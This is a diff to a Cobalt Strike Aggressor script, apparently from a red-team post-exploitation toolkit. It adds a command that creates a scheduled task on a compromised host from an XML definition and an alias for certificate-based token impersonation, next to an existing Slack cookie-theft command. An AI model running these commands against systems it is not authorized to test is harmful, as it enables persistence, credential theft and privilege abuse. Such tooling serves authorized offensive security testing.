@@ -1939,3 +1939,32 @@ beacon_command_register(
 
 Usage: slack_cookie <pid> "
 );
+
+sub bschtaskscreate
+{
+    local('$server $taskpath $taskxml $dialog $fpath $fp $bid $fdata $mode $index $force $args');
+    $bid = $1;
+    $server = "";
+    $fp = $null;
+    $taskpath = $2;
+    $mode = 1;
+    $force = 1;
+    $fpath = $3;
+    if(!-canread $fpath)
+    {
+        berror($bid, "Unable to read the xml task definition file: $fpath");
+        return;
+    }
+    $fp = openf($fpath);
+    $fdata = readb($fp, -1);
+    closef($fp);
+
+    $args = bof_pack($bid, "ZZZii", $server, $taskpath, $fdata, $mode, $force);
+    beacon_inline_execute($bid, readbof($bid, "schtaskscreate"), "go", $args);
+}
+
+alias make_token_cert
+{
+    $args = bof_pack($1, "z", $2);
+    beacon_inline_execute($1, readbof($1, "make_token_cert"), "go", $args);
+}
